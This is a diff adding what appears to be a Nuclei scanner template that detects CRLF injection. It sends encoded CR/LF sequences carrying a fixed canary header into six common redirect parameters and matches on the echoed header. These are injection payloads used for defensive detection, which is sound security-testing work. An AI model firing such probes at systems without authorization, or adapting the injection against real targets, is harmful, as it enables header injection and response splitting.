@@ -1,0 +1,53 @@
+# gap: crlf-injection-header-reflection
+id: crlf-injection-header-reflection
+
+info:
+  name: CRLF Injection via Unfiltered URL Parameter Reflected into Response Headers
+  author: TyrusRC
+  severity: medium
+  description: |
+    Injects an encoded CRLF sequence followed by a fixed canary header name
+    (X-Nuclei-CRLF-Canary) into common redirect URL parameters. If the server
+    fails to strip CR/LF bytes before placing parameter content into a
+    response header (commonly Location), the canary appears as a real header
+    on the wire and the injection is confirmed. Uses a fixed canary instead
+    of a per-request nonce because Nuclei does not consistently substitute
+    the same random value into both the request path and a matcher regex
+    within one block; the fixed canary introduces a small false-positive
+    risk only against servers that already emit that exact header name.
+  reference:
+    - https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/CRLF%20Injection/README.md
+    - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+  tags: custom,vulnerabilities,crlf,injection,owasp
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=%0d%0aX-Nuclei-CRLF-Canary:%201"
+      - "{{BaseURL}}/?redirect=%0d%0aX-Nuclei-CRLF-Canary:%201"
+      - "{{BaseURL}}/?next=%0d%0aX-Nuclei-CRLF-Canary:%201"
+      - "{{BaseURL}}/?return=%0d%0aX-Nuclei-CRLF-Canary:%201"
+      - "{{BaseURL}}/?target=%0d%0aX-Nuclei-CRLF-Canary:%201"
+      - "{{BaseURL}}/?dest=%0d%0aX-Nuclei-CRLF-Canary:%201"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 303
+          - 307
+          - 308
+      - type: word
+        part: header
+        case-insensitive: true
+        negative: true
+        words:
+          - "server: cloudflare"
+          - "cf-ray:"
+      - type: regex
+        part: header
+        regex:
+          - "(?i)X-Nuclei-CRLF-Canary:\\s*1"
